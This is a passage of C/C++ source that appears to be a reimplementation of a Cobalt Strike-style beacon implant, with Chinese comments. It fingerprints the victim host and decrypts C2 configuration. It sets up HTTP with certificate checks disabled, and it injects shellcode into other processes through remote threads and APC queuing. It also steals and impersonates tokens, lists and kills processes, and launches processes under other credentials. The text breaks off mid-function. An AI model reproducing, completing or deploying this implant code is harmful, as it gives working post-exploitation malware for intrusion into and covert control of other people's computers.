#include "common.h"
#include "comm.h"
#include "BeaconInject.h"
#include "Beaconrportfwd.h"
//#include "c2profile.h"

BOOL X86orX64()
{
#ifdef _WIN64
	return 1;
#else
	return 0;
#endif // _WIN64
}

/// <summary>
/// 判断系统架构
/// </summary>
/// <param name="hProcess"></param>
/// <returns></returns>
int Is_Wow64(HANDLE hProcess)
{
	HMODULE kernel32base;
	BOOL(__stdcall * IsWow64Process)(HANDLE, PBOOL);
	int result;
	int v4 = 0;
	kernel32base = GetModuleHandleA("kernel32");
	IsWow64Process = (BOOL(__stdcall*)(HANDLE, PBOOL))GetProcAddress(kernel32base, "IsWow64Process");
	if (!IsWow64Process || (result = IsWow64Process(hProcess, &v4)) != 0)
	{
		result = v4;
	}
	return result;
}

/// <summary>
/// 判断是否是管理员权限
/// </summary>
/// <returns></returns>
BOOL is_admin()
{
	struct _SID_IDENTIFIER_AUTHORITY pIdentifierAuthority;

	PSID pSid;

	BOOL IsMember;

	pIdentifierAuthority.Value[0] = 0;
	pIdentifierAuthority.Value[1] = 0;
	pIdentifierAuthority.Value[2] = 0;
	pIdentifierAuthority.Value[3] = 0;
	pIdentifierAuthority.Value[4] = 0;
	pIdentifierAuthority.Value[5] = 5;
	IsMember = AllocateAndInitializeSid(&pIdentifierAuthority, 2u, 0x20u, 0x220u, 0, 0, 0, 0, 0, 0, &pSid);
	if (!IsMember)
	{
		return IsMember;
	}
	if (!CheckTokenMembership(0, pSid, &IsMember))
	{
		IsMember = 0;
	}
	FreeSid(pSid);
	return IsMember;
}

/// <summary>
/// dns部分是废弃的
/// </summary>
void init_socket_options()
{
	struct WSAData WSAData;


	if (init_WSA != 1)                          // //判断是否初始化过
	{
		if (WSAStartup(0x202u, &WSAData) < 0)
		{
			WSACleanup();
			exit(1);
		}
		init_WSA = 1;
		//cs旧版本的遗留问题无用
		dns_sleep = decryptDWORD(shark_dns_sleep);                  // .dns-beacon.dns_sleep
		dns_idle = decryptDWORD(shark_dns_idle);                   // .dns-beacon.dns_idle
		dns_get_A = decryptString(shark_dns_get_A);               // .dns-beacon.get_A
		dns_get_AAAA = decryptString(shark_dns_get_AAAA);            // .dns-beacon.get_AAAA
		dns_get_TXT = decryptString(shark_dns_get_TXT);             // .dns-beacon.get_TXT
		dns_Listeneroptions_dnsresolver = decryptString(shark_dns_Listeneroptions_dnsresolver);// dns监听器的配置选项dnsresolver
	}
}


int get_pc_ip(char* name)
{
	struct hostent* phostent;
	char** h_addr_list;
	int result;


	init_socket_options();
	if (!gethostname(name, 256)
		&& (phostent = gethostbyname(name)) != 0
		&& phostent->h_addrtype == AF_INET
		&& (h_addr_list = phostent->h_addr_list, *h_addr_list))
	{
		result = *(DWORD*)*h_addr_list;                    // 网络字节序IP数字
	}
	else
	{
		result = 0;
	}
	return result;
}

/// <summary>
/// 获取pc信息保存到元数据
/// </summary>
/// <param name="pmetadata"></param>
void get_pc_info(beaconmetadata* pmetadata)
{
	LPOSVERSIONINFOA lpVersionInformation;
	
	int Buffer_len;
	char* Buffer;
	
	int hostinfo;

	CHAR* ComputerName;
	CHAR* UserName;
	char* lpFilename;
	const char* ProcessName;

	DWORD BufferSize;
	datap* pdatap;

	pdatap = (datap*)BeaconDataInit(0x494);
	lpVersionInformation = (LPOSVERSIONINFOA)BeaconDataPtr(pdatap, 148);
	Buffer = (char*)BeaconDataPtr(pdatap, 256);
	ComputerName = (char*)BeaconDataPtr(pdatap, 256);
	UserName = (char*)BeaconDataPtr(pdatap, 256);
	lpFilename = (char*)BeaconDataPtr(pdatap, 256);

	BufferSize = 256;
	GetUserNameA(UserName, &BufferSize);
	BufferSize = 256;
	GetComputerNameA(ComputerName, &BufferSize);
	hostinfo = get_pc_ip(lpFilename);

	char* temp;
	if (!GetModuleFileNameA(0, lpFilename, 0x100)
		|| (temp = strrchr(lpFilename, 92)) == 0
		|| (ProcessName = temp + 1, temp == (char*)-1))
	{
		ProcessName = "";
	}
	lpVersionInformation->dwOSVersionInfoSize = 148;
	GetVersionExA(lpVersionInformation);
	g_dwMajorVersion = lpVersionInformation->dwMajorVersion;
	BeaconMetadataPush_1(g_dwMajorVersion, pmetadata);
	BeaconMetadataPush_1(lpVersionInformation->dwMinorVersion, pmetadata);
	BeaconMetadataPush_2(LOWORD(lpVersionInformation->dwBuildNumber), pmetadata);
#ifdef _WIN64
	uint64 p = (ULONG64)GetProcAddress;
	BeaconMetadataPush_4(HIDWORD(p),pmetadata);
	BeaconMetadataPush_4((u_long)GetModuleHandleA, pmetadata);
	BeaconMetadataPush_4((u_long)GetProcAddress, pmetadata);// 把函数这两个重要的函数地址也保持起来
#else
	BeaconMetadataPush_4(0, pmetadata);
	BeaconMetadataPush_4((ULONG)GetModuleHandleA, pmetadata);
	BeaconMetadataPush_4((ULONG)GetProcAddress, pmetadata);// 把函数这两个重要的函数地址也保持起来
#endif // _WIN64

	
	BeaconMetadataPush_4(hostinfo, pmetadata);
	
	_snprintf(Buffer, 0x100, "%s\t%s\t%s", ComputerName, UserName, ProcessName);// 计算机名 用户名 自身进程名
	Buffer_len = strlen(Buffer);
	if (Buffer_len > 58)
	{
		Buffer_len = 58;                                    // 不能超过58字节
	}
	
	BeaconMetadataPush_N(Buffer_len, pmetadata, Buffer);
	BeaconDataFree(pdatap);
}

/// <summary>
/// 全局beacon的TokenHandle
/// </summary>
HANDLE pTokenHandle;

/// <summary>
/// win http flags
/// </summary>
DWORD g_dwFlags;

/// <summary>
/// 
/// </summary>
HINTERNET g_hInternet;

/// <summary>
/// 
/// </summary>
HINTERNET g_hConnect;

/// <summary>
/// 
/// </summary>
DWORD_PTR g_dwContext;

/// <summary>
/// 关闭token伪造
/// </summary>
void close_token_fake()
{
	if (pTokenHandle)
	{
		RevertToSelf();
	}
}

/// <summary>
/// 重新启用token伪造
/// </summary>
/// <returns></returns>
void restore_token_fake()
{
	if (pTokenHandle)
	{
		ImpersonateLoggedOnUser(pTokenHandle);
	}
}
//无c2profile
/*void set_winit_http(LPCSTR lpszServerName, INTERNET_PORT ServerPort, LPCSTR lpszAgent)
{
	int Proxyset;
	HINTERNET hInternet;  
	HINTERNET hConnect; 
	char* username_str;  
	char* password_str; 
	char* ProxyStrBuffer; 
	unsigned int username_str_len; 
	unsigned int password_str_len; 
	int lpBuffer; 

	lpBuffer = 240000;
	close_token_fake();
	//0x84400200 INTERNET_FLAG_KEEP_CONNECTION| INTERNET_FLAG_NO_CACHE_WRITE| INTERNET_FLAG_RELOAD| INTERNET_FLAG_NO_UI
	//0x84C03200 INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE| INTERNET_FLAG_NO_UI
	//0x00800000 INTERNET_FLAG_SECURE
	
	g_dwFlags = (decryptInt(shark_flaghttpopen) & 8) != 8 ? 0x84400200 : 0x84C03200;
	if (decryptInt(shark_usesCookieBeacon) == 1)
	{
		g_dwFlags |= INTERNET_FLAG_NO_COOKIES;
	}
	Proxyset = get_short(35);                     // 判断是否需要设置http代理
	if (Proxyset)
	{
		if (!Proxyset - 1)
		{
			hInternet = InternetOpenA(lpszAgent, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
			goto LABEL_8;
		}

		if (!Proxyset - 2)
		{
			hInternet = InternetOpenA(lpszAgent, INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
			goto LABEL_8;
		}
		if (Proxyset - 2 != 2)
		{
			goto LABEL_9;
		}
	}
	ProxyStrBuffer = get_str(32);
	hInternet = InternetOpenA(lpszAgent, INTERNET_OPEN_TYPE_PROXY, ProxyStrBuffer, 0, 0);
LABEL_8:
	g_hInternet = hInternet;
LABEL_9:
	InternetSetOptionA(g_hInternet, INTERNET_OPTION_SEND_TIMEOUT, &lpBuffer, 4u);
	InternetSetOptionA(g_hInternet, INTERNET_OPTION_CONTROL_RECEIVE_TIMEOUT, &lpBuffer, 4u);
	hConnect = InternetConnectA(g_hInternet, lpszServerName, ServerPort, 0, 0, INTERNET_SERVICE_HTTP, 0, g_dwContext);

    g_hConnect = hConnect;
	if (get_short(35) == 4)
	{
		username_str_len = get_str_config_len(33);
		username_str = get_str(33);
		InternetSetOptionA(hConnect, INTERNET_OPTION_PROXY_USERNAME, username_str, username_str_len);
		password_str_len = get_str_config_len(34);
		password_str = get_str(34);
		InternetSetOptionA(g_hConnect, INTERNET_OPTION_PROXY_PASSWORD, password_str, password_str_len);
	}
	
	restore_token_fake();
	return;
}*/


void __stdcall fnInternetCallback(HINTERNET hInternet, DWORD_PTR dwContext, DWORD dwInternetStatus, LPVOID lpvStatusInformation, DWORD dwStatusInformationLength)
{
	char* lpszHeaders;

	if (dwInternetStatus == 21)
	{
		lpszHeaders = decryptString(shark_lpszHeaders);
		HttpAddRequestHeadersA(hInternet, lpszHeaders, 0xFFFFFFFF, 0x80000000);
	}
}

void set_http_opt(HINTERNET hInternet)
{
	
	int Buffer = 0;
	//SECURITY_FLAG_IGNORE_CERT_CN_INVALID| SECURITY_FLAG_IGNORE_CERT_DATE_INVALID| SECURITY_FLAG_IGNORE_WRONG_USAGE| SECURITY_FLAG_IGNORE_UNKNOWN_CA| SECURITY_FLAG_IGNORE_REVOCATION
	if ((decryptInt(shark_flaghttpopen) & 8) != 0)
	{
		DWORD dwBufferLength = 4;
		InternetQueryOptionA(hInternet, INTERNET_OPTION_SECURITY_FLAGS, &Buffer, &dwBufferLength);
		Buffer |= 0x3380u;
		InternetSetOptionA(hInternet, INTERNET_OPTION_SECURITY_FLAGS, &Buffer, 4);
	}
	if (decryptString(shark_lpszHeaders))
	{
		InternetSetStatusCallback(hInternet, fnInternetCallback);
	}
}

/// <summary>
/// 判断http请求返回是否成功
/// </summary>
/// <param name="hRequest"></param>
/// <returns></returns>
BOOL verify_http_200(HINTERNET hRequest)
{
	BOOL state;
	char Buffer[256] = {0};
	DWORD dwBufferLength;

	dwBufferLength = 256;
	state = HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE, Buffer, &dwBufferLength, 0);
	if (state)
	{
		state = atoi(Buffer) == 200;
	}
	return state;
}

//************************************
// Method:    isEnableBlockDLL
// FullName:  isEnableBlockDLL
// Access:    public 
// Returns:   int
// Qualifier:判断是否使用BlockDLL和PPID
// Parameter: int PPID
//************************************
int isPPIDAndBlockDLL(int PPID)
{
	if (PPID)
	{
		if (gBeaconBlockDLL == 1)
		{
			return 2;
		}
	}
	else if (!gBeaconBlockDLL)
	{
		return 0;
	}
	return 1;
}

BOOL __cdecl toWideChar(char* lpMultiByteStr, wchar_t* lpWideCharStr, unsigned int max)
{
	unsigned int size;

	size = MultiByteToWideChar(0, 0, lpMultiByteStr, -1, 0, 0);
	if (size == -1 || size >= max)
	{
		return 0;
	}
	MultiByteToWideChar(0, 0, lpMultiByteStr, -1, lpWideCharStr, max);
	return 1;
}

int is_process_arch(HANDLE hProcess)
{
	HANDLE self_process;
	int result;

	if (X86orX64())
	{
		return Is_Wow64(hProcess) == 0;
	}
	self_process = GetCurrentProcess();
	result = Is_Wow64(self_process);
	if (result)
	{
		return Is_Wow64(hProcess) == 0;             // 32-bit  64-bit  TRUE  
													// ret FALSE
	}
	return result;                                // 64-bit  64-bit  FALSE
												  // 32-bit  32-bit  FALSE
												  // ret TRUE
}

 _PROC_THREAD_ATTRIBUTE_LIST* CreateProcessAttributeList(DWORD dwAttributeCount)
{

	ULONG_PTR Size = 0;
	InitializeProcThreadAttributeList(0, dwAttributeCount, 0, &Size);
	_PROC_THREAD_ATTRIBUTE_LIST* lpAttributeList = (_PROC_THREAD_ATTRIBUTE_LIST*)HeapAlloc(GetProcessHeap(), 0, Size);
	if (lpAttributeList && InitializeProcThreadAttributeList(lpAttributeList, dwAttributeCount, 0, &Size))
	{
		return lpAttributeList;
	}
	else
	{
		return 0;
	}
}

void BeaconcloseHandle(BeaconCreateprocess* pBeaconCreateprocess)
{
	CloseHandle(pBeaconCreateprocess->process);
}

void BeaconSetErrorMode(BeaconCreateprocess* pBeaconCreateprocess)
{
	SetErrorMode(pBeaconCreateprocess->SetErrorMode_value);
}

void BeaconcloseAllHandle(_PROCESS_INFORMATION* pi)
{
	if (pi->hProcess != (HANDLE)-1 && pi->hProcess)
	{
		CloseHandle(pi->hProcess);
	}
	if (pi->hThread != (HANDLE)-1)
	{
		if (pi->hThread)
		{
			CloseHandle(pi->hThread);
		}
	}
}

BOOL BeaconCreateRemoteThread(HANDLE hProcess, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter)
{
	return CreateRemoteThread(hProcess, 0, 0, lpStartAddress, lpParameter, 0, 0) != 0;
}

BOOL BeaconCreateThread(LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter)
{
	return CreateThread(0, 0, lpStartAddress, lpParameter, 0, 0) != 0;
}

BOOL BeaconRtlCreateUserThread(HANDLE hProcess, LPVOID BaseAddress, LPVOID lpParameter)
{
	 auto ntdllbase = GetModuleHandleA("ntdll.dll");
	 RtlCreateUserThread_t RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(ntdllbase, "RtlCreateUserThread");
	 if (!RtlCreateUserThread)
	 {
		 return 0;
	 }
	 HANDLE ThreadHandle;
	 CLIENT_ID pCLIENT_ID;
	 RtlCreateUserThread(hProcess, 0, 0, 0, 0, 0, BaseAddress, lpParameter, &ThreadHandle, &pCLIENT_ID);
	 return ThreadHandle != 0;
}

#pragma pack(1)
typedef struct {
	char field_0[sizeof(sub_10033070)];
	HANDLE hProcess;
	DWORD field_12D;
	PVOID StartAddress;
	DWORD field_135;
	PVOID lpParameter;
	DWORD field_13D;
	HANDLE hThread;
	DWORD field_145;
}BeaconShellcode;
#pragma pack()

int sub_1000535D(HANDLE hProcess, LPVOID BaseAddress, LPVOID lpParameter)
{

	OSVERSIONINFOA VersionInformation = { 0 };
	VersionInformation.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
	if (!GetVersionExA(&VersionInformation))
	{
		return 0;
	}
	if (VersionInformation.dwMajorVersion == 5 && VersionInformation.dwMinorVersion == 2)
	{
		SetLastError(5);
		return 0;
	}
	char* lpAddress = (char*)VirtualAlloc(0, sizeof(sub_10033020), MEM_COMMIT| MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!lpAddress)
	{
		return 0;
	}
	BeaconShellcode* lpAddress2 = (BeaconShellcode*)VirtualAlloc(0, sizeof(BeaconShellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!lpAddress2)
	{
		VirtualFree(lpAddress, 0, MEM_RELEASE);
		return 0;
	}
	memcpy(lpAddress, sub_10033020, sizeof(sub_10033020));
	memcpy(lpAddress2, sub_10033070, sizeof(sub_10033070));

	lpAddress2->hThread = 0;
	lpAddress2->hProcess = hProcess;
	lpAddress2->StartAddress = BaseAddress;
	lpAddress2->lpParameter = lpParameter;
	if (!((int(__stdcall*)(BeaconShellcode*, HANDLE*))lpAddress)(lpAddress2, &lpAddress2->hProcess))
	{
		VirtualFree(lpAddress, 0, MEM_RELEASE);
		VirtualFree(lpAddress2, 0, MEM_RELEASE);
		SetLastError(5);
		return 0;
	}
	if (!lpAddress2->hThread)
	{
		VirtualFree(lpAddress, 0, MEM_RELEASE);
		VirtualFree(lpAddress2, 0, MEM_RELEASE);
		SetLastError(6);
		return 0;
	}
	ResumeThread(lpAddress2->hThread);
	VirtualFree(lpAddress, 0, MEM_RELEASE);
	VirtualFree(lpAddress2, 0, MEM_RELEASE);
	return 1;
}

#pragma pack(1)
typedef struct {
	PVOID StartAddress;
	PVOID lpParameter;
	CreateThread_t pCreateThread;
	DWORD field_C;
}BeaconShellcodeinjec;
#pragma pack()

//特殊函数 shellcode
void __stdcall sub_10004D1D(BeaconShellcodeinjec* pBeaconShellcodeinjec)
{

	if (!pBeaconShellcodeinjec->field_C)
	{
		_TEB* teb = (_TEB*)NtCurrentTeb();
		pBeaconShellcodeinjec->field_C = 1;
		if (teb->ActivationContextStackPointer)
		{
			pBeaconShellcodeinjec->pCreateThread(
				NULL,
				NULL,
				(LPTHREAD_START_ROUTINE)pBeaconShellcodeinjec->StartAddress,
				pBeaconShellcodeinjec->lpParameter,
				NULL,
				NULL);
		}
		else
		{
			pBeaconShellcodeinjec->field_C = 0;
		}
	}
}

void* sub_10004D53(HANDLE hProcess, int pid, BeaconShellcodeinjec* pBeaconShellcodeinjec)
{
	//注意shellcode
	char* pshellcode = (char*)malloc((char*)sub_10004D53 - (char*)sub_10004D1D + sizeof(BeaconShellcodeinjec));

	memcpy((char*)pshellcode + sizeof(BeaconShellcodeinjec), sub_10004D1D, (char*)sub_10004D53 - (char*)sub_10004D1D);
	int shellcode_size = (char*)sub_10004D53 - (char*)sub_10004D1D + sizeof(BeaconShellcodeinjec);
	char* pshellcodeAddress = (char*)VirtualAllocEx(hProcess, 0, shellcode_size, MEM_COMMIT| MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	SIZE_T NumberOfBytesWritten = 0;
	if ( pshellcodeAddress 
		&& 
		WriteProcessMemory(hProcess, pshellcodeAddress, pshellcode, shellcode_size, &NumberOfBytesWritten) 
		&& 
		NumberOfBytesWritten != shellcode_size)
	{
		pshellcodeAddress = 0;
	}
	free(pshellcode);
	return pshellcodeAddress;
}

int sub_10004DDE(BeaconProcessInject* pBeaconProcessInject, LPVOID BaseAddress, LPVOID lpParameter)
{
	THREADENTRY32 te = { 0 };
	te.dwSize = sizeof(THREADENTRY32);
	BeaconShellcodeinjec pBeaconShellcodeinjec;
	pBeaconShellcodeinjec.StartAddress = BaseAddress;
	pBeaconShellcodeinjec.lpParameter = lpParameter;
	pBeaconShellcodeinjec.pCreateThread = CreateThread;
	pBeaconShellcodeinjec.field_C = 0;

	NtQueueApcThread_t NtQueueApcThread = (NtQueueApcThread_t)GetProcAddress(GetModuleHandleA("ntdll"), "NtQueueApcThread");
	if (!NtQueueApcThread)
	{
		return 0;
	}
	char* pshellcodeAddress = (char*)sub_10004D53(pBeaconProcessInject->hProcess, pBeaconProcessInject->Process_PID, &pBeaconShellcodeinjec);
	if (!pshellcodeAddress)
	{
		return 0;
	}
	HANDLE Toolhelp32Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (!Toolhelp32Snapshot || !Thread32First(Toolhelp32Snapshot, &te))
	{
		return 0;
	}
	do
	{
		if (te.th32OwnerProcessID == pBeaconProcessInject->Process_PID)
		{
			HANDLE thread = OpenThread(0x1FFFFF, 0, te.th32ThreadID);
			if (thread)
			{
				NtQueueApcThread(thread, (PIO_APC_ROUTINE)(pshellcodeAddress + 16), pshellcodeAddress,NULL,NULL);
				CloseHandle(thread);
			}
		}
	} while (Thread32Next(Toolhelp32Snapshot, &te));
	CloseHandle(Toolhelp32Snapshot);
	Sleep(0xC8);
	SIZE_T NumberOfBytesRead;
	if (!ReadProcessMemory(pBeaconProcessInject->hProcess, pshellcodeAddress, &pBeaconShellcodeinjec, sizeof(BeaconShellcodeinjec), &NumberOfBytesRead)
		|| NumberOfBytesRead != sizeof(BeaconShellcodeinjec))
	{
		return 0;
	}
	if (!pBeaconShellcodeinjec.field_C)
	{
		pBeaconShellcodeinjec.field_C = 1;
		WriteProcessMemory(pBeaconProcessInject->hProcess, pshellcodeAddress, &pBeaconShellcodeinjec, sizeof(BeaconShellcodeinjec), &NumberOfBytesRead);
		return 0;
	}
	return 1;
}


BOOL BeaconNtQueueApcThread(BeaconProcessInject* pBeaconProcessInject, LPVOID BaseAddress, LPVOID lpParameter)
{
	NtQueueApcThread_t NtQueueApcThread = (NtQueueApcThread_t)GetProcAddress(GetModuleHandleA("ntdll"), "NtQueueApcThread");
	return NtQueueApcThread && !NtQueueApcThread(pBeaconProcessInject->hThread, (PIO_APC_ROUTINE)BaseAddress, lpParameter, 0, 0) && ResumeThread(pBeaconProcessInject->hThread) != -1;
}

void BeaconExpandEnvironmentStringsA(LPCSTR lpSrc, LPSTR lpDst, size_t Size)
{
	 DWORD size = ExpandEnvironmentStringsA(lpSrc, 0, 0);
	if (size)
	{
		if (size + 1 < Size)
		{
			memset(lpDst, 0, Size);
			ExpandEnvironmentStringsA(lpSrc, lpDst, size);
		}
	}
}

void check_close_token_fake(int ignoreToken)
{
	if (ignoreToken)
	{
		close_token_fake();
	}
}

void check_restore_token_fake(int ignoreToken)
{
	if (ignoreToken)
	{
		restore_token_fake();
	}
}

int get_user_sid(size_t BufferSize, HANDLE TokenHandle, char* Buffer)
{

	CHAR Name[512];
	CHAR ReferencedDomainName[512];
	DWORD cchReferencedDomainName = 512;
	
	_SID_NAME_USE peUse;
	memset(Buffer, 0, BufferSize);
	memset(Name, 0, sizeof(Name));
	memset(ReferencedDomainName, 0, sizeof(ReferencedDomainName));

	DWORD ReturnLength;
	PSID TokenInformation[4096];
	DWORD cchName = 512;
	if (!GetTokenInformation(TokenHandle, TokenUser, TokenInformation, 0x1000, &ReturnLength)
		|| !LookupAccountSidA(
			0,
			TokenInformation[0],
			Name,
			&cchName,
			ReferencedDomainName,
			&cchReferencedDomainName,
			&peUse))
	{
		return 0;
	}
	_snprintf(Buffer, BufferSize, "%s\\%s", ReferencedDomainName, Name);
	Buffer[BufferSize - 1] = 0;
	return 1;
}

void BeaconSendUserInfo(HANDLE hPrcoess)
{
	u_long Buffer[256];
	char usersid[512];

	if (get_user_sid(0x200, hPrcoess, usersid))
	{
		if (is_admin())
		{
			_snprintf((char* const)Buffer, 0x400u, "%s (admin)", usersid);
		}
		else
		{
			_snprintf((char* const)Buffer, 0x400u, "%s", usersid);
		}
		BeaconTaskOutput((char*)Buffer, strlen((char*)Buffer), 0x10);
	}
}


void beacon_GetUID()
{
	HANDLE TokenHandle;

	if (OpenThreadToken(GetCurrentThread(), 8u, 0, &TokenHandle))
	{
		goto LABEL_3;
	}
	if (OpenProcessToken(GetCurrentProcess(), 8u, &TokenHandle))
	{
	LABEL_3:
		BeaconSendUserInfo(TokenHandle);
		CloseHandle(TokenHandle);
	}
	else if (pTokenHandle)
	{
		close_token_fake();
		BeaconSendUserInfo(pTokenHandle);
		restore_token_fake();
	}
	else
	{
		BeaconErrorNA(1u);
	}
}

datap* BeaconMaketoken;
void BeaconRevertToken()
{
	if (pTokenHandle)
	{
		CloseHandle(pTokenHandle);
	}
	pTokenHandle = 0;
	RevertToSelf();
	if (BeaconMaketoken)
	{
		BeaconDataClear(BeaconMaketoken);
		BeaconDataFree(BeaconMaketoken);
		lpDomain = 0;
		lpWideCharStr = 0;
		lpPassword = 0;
		BeaconMaketoken = 0;
		Create_token_Flag = 0;
	}
}

void beacon_steal_token(char* Taskdata, int Task_size)
{

	char usersid[0x200];
	HANDLE TokenHandle;
	if (Task_size == 4)
	{
		int pid = ntohl(*(u_long*)Taskdata);
		HANDLE hprocess = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);
		if (hprocess)
		{
			if (OpenProcessToken(hprocess, TOKEN_ALL_ACCESS, &TokenHandle))
			{
				BeaconRevertToken();
				if (ImpersonateLoggedOnUser(TokenHandle))
				{
					if (DuplicateTokenEx(TokenHandle, 0x2000000, 0, SecurityDelegation, TokenPrimary, &pTokenHandle))
					{
						if (ImpersonateLoggedOnUser(pTokenHandle))
						{
							CloseHandle(hprocess);
							if (TokenHandle)
							{
								CloseHandle(TokenHandle);
							}
							if (get_user_sid(0x200, pTokenHandle, usersid))
							{
								BeaconTaskOutput(usersid, strlen(usersid), 0xF);
							}
						}
						else
						{
							BeaconErrorDD(0x27, pid, GetLastError());
						}
					}
					else
					{
						BeaconErrorDD(0x26, pid, GetLastError());
					}
				}
				else
				{
					BeaconErrorDD(0x25, pid, GetLastError());
				}
			}
			else
			{
				BeaconErrorDD(0x24, pid, GetLastError());
			}
		}
		else
		{
			BeaconErrorDD(0x21, pid, GetLastError());
		}
	}
}


BOOL GetProcessUserInfo(HANDLE ProcessHandle, char* usersid)
{

	HANDLE TokenHandle;
	BOOL status = OpenProcessToken(ProcessHandle, 8u, &TokenHandle);
	if (status)
	{
		status = get_user_sid(0x800, TokenHandle, usersid);
		CloseHandle(TokenHandle);
		return status;
	}
	return status;
}

void beacon_ps(char* Taskdata, int Task_size)
{

	char usersid[2048];
	memset(usersid, 0, sizeof(usersid));

	datap datap;
	BeaconDataParse(&datap, Taskdata, Task_size);
	int unknown = BeaconDataInt(&datap);
	BeaconFormatAlloc((formatp*)&datap, 0x8000);
	if (unknown > 0)
	{
		BeaconFormatInt((formatp*)&datap, unknown);
	}
	const char* arch;
	if (Is_Wow64(GetCurrentProcess()))
	{
		arch = "x64";
	}
	else
	{
		arch = "x64";
		if (!X86orX64())
		{
			arch = "x86";
		}
	}
	DWORD pSessionId;
	DWORD th32ProcessID;
	PROCESSENTRY32 pe;
	HANDLE hprocess;
	HANDLE Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
	if (Toolhelp32Snapshot != (HANDLE)-1)
	{
		pe.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(Toolhelp32Snapshot, &pe))
		{
			do
			{
				th32ProcessID = pe.th32ProcessID;
				hprocess = OpenProcess(g_dwMajorVersion >= 6 ? 4096 : 1024, 0, th32ProcessID);
				if (hprocess)
				{
					if (!GetProcessUserInfo(hprocess, usersid))
					{
						usersid[0] = 0;
					}
					if (!ProcessIdToSessionId(pe.th32ProcessID, &pSessionId))
					{
						pSessionId = -1;
					}
					const char* arch2 = "x86";
					if (Is_Wow64(hprocess) == 0)
					{
						arch2 = arch;
					}
					BeaconFormatPrintf(
						(formatp*)&datap,
						(char*)"%s\t%d\t%d\t%s\t%s\t%d\n",
						pe.szExeFile,
						pe.th32ParentProcessID,
						pe.th32ProcessID,
						arch2,
						usersid,
						pSessionId);
				}
				else
				{
					BeaconFormatPrintf((formatp*)&datap, (char*)"%s\t%d\t%d\n", pe.szExeFile, pe.th32ParentProcessID, pe.th32ProcessID);
				}
				CloseHandle(hprocess);
			} while (Process32Next(Toolhelp32Snapshot, &pe));
			CloseHandle(Toolhelp32Snapshot);
			int msg_type;
			if (unknown)
			{
				msg_type = 22;
			}
			else
			{
				msg_type = 17;
			}
			int datalength = BeaconFormatlength((formatp*)&datap);
			char* databuffer = BeaconFormatOriginalPtr((formatp*)&datap);
			BeaconTaskOutput(databuffer, datalength, msg_type);
			BeaconFormatFree((formatp*)&datap);
		}
		else
		{
			CloseHandle(Toolhelp32Snapshot);
		}
	}
}

void beacon_Kill(char* Taskdata, int Task_size)
{
	datap pdatap = { 0 };
	BeaconDataParse(&pdatap, Taskdata, Task_size);
	int pid = BeaconDataInt(&pdatap);
	HANDLE hPrcoess = OpenProcess(PROCESS_TERMINATE, 0, pid);
	if (!hPrcoess || !TerminateProcess(hPrcoess, 0))
	{
		BeaconErrorDD(0x23u, pid, GetLastError());
	}
	CloseHandle(hPrcoess);
}


int BeaconRunAsProcess(
	char* lpDomain,
	char* lpPassword,
	char* lpUsername,
	char* lpCommandLine,
	int dwCreationFlags,
	LPPROCESS_INFORMATION lpProcessInformation)
{
	memset(lpProcessInformation, 0, sizeof(PROCESS_INFORMATION));

	datap* pdatap = BeaconDataInit(0xA000u);
	WCHAR* CommandLine = (WCHAR*)BeaconDataPtr(pdatap, 0x4000);
	WCHAR* Domain = (WCHAR*)BeaconDataPtr(pdatap, 1024);
	WCHAR* Username = (WCHAR*)BeaconDataPtr(pdatap, 1024);
	WCHAR* Password = (WCHAR*)BeaconDataPtr(pdatap, 1024);
	WCHAR* Buffer = (WCHAR*)BeaconDataPtr(pdatap, 1024);

	STARTUPINFOA StartupInfo = { 0 };
	StartupInfo.cb = sizeof(STARTUPINFOA);
	GetStartupInfoA(&StartupInfo);

	StartupInfo.dwFlags = 257;
	StartupInfo.wShowWindow = 0;
	StartupInfo.hStdInput = 0;
	StartupInfo.hStdOutput = 0;
	StartupInfo.hStdError = 0;
	StartupInfo.lpDesktop = 0;

	toWideChar(lpCommandLine, CommandLine, 0x4000u);
	toWideChar(lpPassword, Username, 0x400u);
	toWideChar(lpUsername, Password, 0x400u);
	toWideChar(lpDomain, Domain, 0x400u);
	WCHAR* lpCurrentDirectory = 0;
	if (GetCurrentDirectoryW(0, 0) >= 0x400)
	{
		lpCurrentDirectory = 0;
	}
	else
	{
		GetCurrentDirectoryW(0x400u, Buffer);
		lpCurrentDirectory = Buffer;
	}
	if (CreateProcessWithLogonW(
		Username,
		Domain,
		Password,
		1,
		0,
		CommandLine,
		dwCreationFlags | 0x8000400,
		0,
		lpCurrentDirectory,
		(LPSTARTUPINFOW)&StartupInfo,
		lpProcessInformation))
	{
		BeaconDataClear(pdatap);
		BeaconDataFree(pdatap);
		return 1;
	}
	else
	{
		BeaconErrorFormat(0x35, (char*)"%s as %s\\%s: %d", lpCommandLine, lpDomain, lpPassword, GetLastError());
	}
	BeaconDataClear(pdatap);
	BeaconDataFree(pdatap);
	return 0;
}

void beacon_RunAs(char* Taskdata, int Task_size)
{
	PROCESS_INFORMATION ProcessInformation;
	datap* pdatap = BeaconDataInit(0x4C00);
	char* lpCommandLine = BeaconDataPtr(pdatap, 0x4000);
	char* lpDomain = BeaconDataPtr(pdatap, 1024);
	char* lpPassword = BeaconDataPtr(pdatap, 1024);
	char* lpUsername = BeaconDataPtr(pdatap, 1024);
	datap taskdatap;
	BeaconDataParse(&taskdatap, Taskdata, Task_size);
	if (BeaconDataCopyToBuffer(&taskdatap, lpDomain, 1024)
		&& BeaconDataCopyToBuffer(&taskdatap, lpPassword, 1024)
		&& BeaconDataCopyToBuffer(&taskdatap, lpUsername, 1024))
	{
		if (BeaconDataCopyToBuffer(&taskdatap, lpCommandLine, 0x4000))
		{
			close_token_fake();
			BeaconRunAsProcess(lpDomain, lpPassword, lpUsername, lpCommandLine, 0, &ProcessInformation);
			restore_token_fake();
